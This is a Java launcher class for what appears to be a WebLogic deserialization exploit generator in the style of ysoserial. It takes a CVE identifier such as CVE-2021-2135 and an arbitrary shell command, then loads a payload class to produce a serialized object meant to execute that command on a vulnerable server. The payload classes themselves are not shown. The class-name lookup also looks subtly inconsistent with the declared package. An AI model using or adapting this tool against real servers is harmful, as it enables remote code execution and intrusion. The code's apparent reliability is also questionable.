package com.r17a.weblogic;

import com.r17a.weblogic.cve.ObjectPayload;

public class Main {
    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;

    public static void main(final String[] args) {
        if (args.length != 2) {
            printUsage();
            System.exit(USAGE_CODE);
        }
        final String cveId = args[0];
        final String cmd = args[1];
//        String cveId = "CVE-2021-2135";
//        String cmd = "calc";

        try {
            String className = "weblogic.cve." + cveIdDeal(cveId);
            final Class<? extends ObjectPayload> clazz = (Class<? extends ObjectPayload>) Class.forName(className);
            ObjectPayload o = clazz.newInstance();
            o.getSerFile(cmd);
        }catch (Exception e){
            System.out.println(e);
        }
    }

    private static String cveIdDeal(String cveId){
        if (cveId.contains("-")) {
            // 替换-为_，CVE-2020-2555->CVE_2020_2555
           cveId = cveId.replace("-","_");
        }
        cveId = cveId.toUpperCase();
        return cveId;
    }

    private static void printUsage() {
        System.err.println("Y SO SERIAL?");
        System.err.println("Usage: java -jar ysoserial-[version]-all.jar [cveid] '[command]'");
        System.err.println("eg: java -jar ysoserial-[version]-all.jar 'CVE-2021-2135' 'calc'");
    }
}
